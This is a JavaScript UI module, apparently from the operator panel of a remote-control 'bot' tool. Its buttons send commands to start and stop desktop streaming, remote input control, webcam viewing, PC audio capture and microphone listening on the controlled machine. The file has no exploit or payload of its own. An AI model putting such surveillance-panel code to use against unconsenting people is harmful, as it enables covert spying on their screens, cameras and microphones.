/* frontend/client_control/js/modules/ui/header.js */
import { AppState } from '../core/states.js';

export function initHeaderControls() {
    const actions = [
        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    // Внутренняя функция для переключения состояния (используется и кликом, и синхронизацией)
    const toggleAction = (action, forceState = null) => {
        const { id, ref, key, mod, cmds } = action;
        const btn = document.getElementById(id);

        // Если forceState передан, устанавливаем его, иначе инвертируем
        ref[key] = (forceState !== null) ? forceState : !ref[key];

        btn?.classList.toggle('active', ref[key]);

        if (window.sendToBot) {
            const cmd = ref[key] ? cmds[0] : cmds[1];
            window.sendToBot(mod, cmd);
            console.log(`[Header] ${id} -> ${cmd}`);
        }
    };

    // Привязка кликов
    actions.forEach(action => {
        const btn = document.getElementById(action.id);
        if (btn) btn.onclick = () => toggleAction(action);
    });

    /**
     * Глобальная функция синхронизации ресурсов.
     * Вызывается из sidebar.js при смене вкладок.
     */
    window.syncModeResources = (mode) => {
        if (mode === 'webcam') {
            // Если ушли на вебку - гасим экран и управление (индекс 0 и 1)
            if (AppState.desktop.observe) toggleAction(actions[0], false);
            if (AppState.desktop.control) toggleAction(actions[1], false);
        } else if (mode === 'desktop') {
            // Если ушли на десктоп - гасим вебку (индекс 2)
            if (AppState.webcam.active) toggleAction(actions[2], false);
        }
        // Звук (индексы 3, 4) игнорируем, он независим
    };
}